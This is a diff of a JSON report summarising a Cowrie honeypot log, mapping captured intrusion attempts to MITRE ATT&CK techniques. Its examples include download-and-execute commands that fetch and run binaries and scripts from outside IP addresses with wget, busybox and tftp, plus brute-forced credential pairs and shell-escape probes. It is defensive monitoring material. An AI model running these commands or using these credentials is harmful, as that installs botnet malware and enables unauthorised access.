@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-08-20 02:03:44",
+  "generated": "2026-08-20 03:03:44",
   "totals": {
-    "commands": 49,
-    "login_failed": 32,
-    "login_success": 5,
-    "sessions": 70
+    "commands": 90,
+    "login_failed": 99,
+    "login_success": 11,
+    "sessions": 161
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 32,
+      "count": 99,
       "examples": [
         "nginx / 150.136.155.47",
         "tyre / tyre",
@@ -21,14 +21,14 @@
         "tyre / tyre1234"
       ],
       "first": "2026-08-20T00:02:12.859219Z",
-      "last": "2026-08-20T02:02:46.713518Z",
-      "unique_ips": 10
+      "last": "2026-08-20T03:03:37.539284Z",
+      "unique_ips": 17
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 24,
+      "count": 28,
       "examples": [
         "/bin/busybox wget http://2.26.136.128/twget.sh -O- | sh;rm -rf tftp.sh;/bin/busybox tftp 2.26.136.128 -g -r tftp.sh -l t",
         "http://2.26.136.128/twget.sh",
@@ -37,14 +37,14 @@
         "wget http://31.77.227.121/satan_arm; chmod 777 satan_arm; ./satan_arm; rm -rf satan_arm"
       ],
       "first": "2026-08-20T01:10:19.623993Z",
-      "last": "2026-08-20T02:02:49.091657Z",
-      "unique_ips": 3
+      "last": "2026-08-20T02:31:49.023894Z",
+      "unique_ips": 4
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 12,
+      "count": 27,
       "examples": [
         "/bin/busybox wget http://2.26.136.128/twget.sh -O- | sh;rm -rf tftp.sh;/bin/busybox tftp 2.26.136.128 -g -r tftp.sh -l t",
         "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/satan_mips; chmod 777 satan_mips; ./sat",
@@ -53,8 +53,24 @@
         "wget http://31.77.227.121/satan_mips_el; chmod 777 satan_mips_el; ./satan_mips_el; rm -rf satan_mips_el"
       ],
       "first": "2026-08-20T01:21:21.761677Z",
-      "last": "2026-08-20T02:02:49.091657Z",
-      "unique_ips": 2
+      "last": "2026-08-20T02:31:49.023894Z",
+      "unique_ips": 3
+    },
+    {
+      "id": "T1078",
+      "name": "Valid Accounts",
+      "tactic": "Initial Access",
+      "count": 11,
+      "examples": [
+        "admin / switch",
+        "admin / admin",
+        "Admin / ",
+        "admin / qwaszx",
+        "enable\\x00 / system\\x00"
+      ],
+      "first": "2026-08-20T01:07:19.606932Z",
+      "last": "2026-08-20T02:50:55.219273Z",
+      "unique_ips": 11
     },
     {
       "id": "T1489",
@@ -70,20 +86,16 @@
       "unique_ips": 1
     },
     {
-      "id": "T1078",
-      "name": "Valid Accounts",
-      "tactic": "Initial Access",
-      "count": 5,
+      "id": "T1033",
+      "name": "System Owner/User Discovery",
+      "tactic": "Discovery",
+      "count": 1,
       "examples": [
-        "admin / switch",
-        "admin / admin",
-        "Admin / ",
-        "admin / qwaszx",
-        "enable\\x00 / system\\x00"
+        "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w"
       ],
-      "first": "2026-08-20T01:07:19.606932Z",
-      "last": "2026-08-20T02:02:47.789244Z",
-      "unique_ips": 5
+      "first": "2026-08-20T02:31:13.448948Z",
+      "last": "2026-08-20T02:31:13.448948Z",
+      "unique_ips": 1
     },
     {
       "id": "T1562.004",
@@ -101,31 +113,43 @@
   "unmapped": [
     [
       "/bin/busybox",
-      3
+      10
     ],
     [
       "enable",
-      2
+      4
     ],
     [
       "system",
-      2
+      4
     ],
     [
       "shell",
-      2
+      4
     ],
     [
       "sh",
-      2
+      4
     ],
     [
       "linuxshell",
-      1
+      3
     ],
     [
       "ping ;sh",
-      1
+      3
+    ],
+    [
+      "enablelinuxshell",
+      2
+    ],
+    [
+      "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
+      2
+    ],
+    [
+      "cd /proc && cat self/cmdline",
+      2
     ],
     [
       "/bin/busybox echo > /tmp/.fxcat && sh /tmp/.fxcat && cd /tmp/",
@@ -165,18 +189,6 @@
     ],
     [
       "/bin/busybox echo > /boot/.fxcat && sh /boot/.fxcat && cd /boot/",
-      1
-    ],
-    [
-      "/bin/busybox echo > /home/.fxcat && sh /home/.fxcat && cd /home/",
-      1
-    ],
-    [
-      "rm -rf .ffaaxx .d",
-      1
-    ],
-    [
-      "ping; sh",
       1
     ]
   ]
